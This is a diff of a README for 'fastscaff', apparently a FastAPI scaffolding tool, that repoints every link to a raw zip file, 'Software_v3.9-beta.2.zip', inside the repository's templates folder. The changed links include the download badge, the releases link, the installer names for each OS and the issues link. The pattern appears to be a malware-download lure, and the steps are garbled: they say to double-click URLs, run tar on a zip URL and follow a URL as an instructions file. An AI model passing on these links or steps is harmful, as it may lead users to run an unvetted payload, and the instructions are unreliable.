@@ -6,7 +6,7 @@ Welcome to **fastscaff**! This application helps you build production-ready Fast
 
 ## 📥 Download Now
 
-[![Download fastscaff](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip)](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip)
+[![Download fastscaff](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip)](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip)
 
 ## 📋 Requirements
 
@@ -26,11 +26,11 @@ Before you start, here are the requirements:
 
 ## 🌐 Download & Install
 
-To get started, **visit this page to download**: [Fastscaff Releases](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip). Here, you will find various versions of the software. Choose the latest version suitable for your operating system.
+To get started, **visit this page to download**: [Fastscaff Releases](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip). Here, you will find various versions of the software. Choose the latest version suitable for your operating system.
 
 1. **Visit the Releases page.**
 2. Find the latest release of fastscaff.
-3. Click on the appropriate installer based on your operating system. If you are unsure, look for files like `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` for Windows or `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` for macOS.
+3. Click on the appropriate installer based on your operating system. If you are unsure, look for files like `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` for Windows or `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` for macOS.
 4. Save the file to your computer.
 
 ## 🛠️ Installation Steps
@@ -38,23 +38,23 @@ To get started, **visit this page to download**: [Fastscaff Releases](https://ra
 ### For Windows
 
 1. Navigate to the folder where you downloaded the installer.
-2. Double-click the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` file.
+2. Double-click the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` file.
 3. Follow the on-screen instructions to complete the installation.
 4. After installation, open your command prompt.
 
 ### For macOS
 
 1. Go to your `Downloads` folder.
-2. Double-click the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` file.
+2. Double-click the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` file.
 3. Drag the fastscaff icon into your `Applications` folder.
 4. Open the Terminal application to run fastscaff.
 
 ### For Linux
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` file.
-3. Use the command `tar -xzf https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip` to extract files.
-4. Follow the provided https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip file in the extracted folder to complete installation.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` file.
+3. Use the command `tar -xzf https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip` to extract files.
+4. Follow the provided https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip file in the extracted folder to complete installation.
 
 ## 🎉 Using fastscaff
 
@@ -80,7 +80,7 @@ After creation, you will find a well-structured FastAPI application consisting o
 
 ## 💬 Support
 
-If you encounter issues or have questions, feel free to create an issue on the [issues page](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/app/services/fastscaff_v1.2.zip). We appreciate your feedback!
+If you encounter issues or have questions, feel free to create an issue on the [issues page](https://raw.githubusercontent.com/sarmadshakeel/fastscaff/main/fastscaff/templates/Software_v3.9-beta.2.zip). We appreciate your feedback!
 
 ## 🛠️ Contributions
 
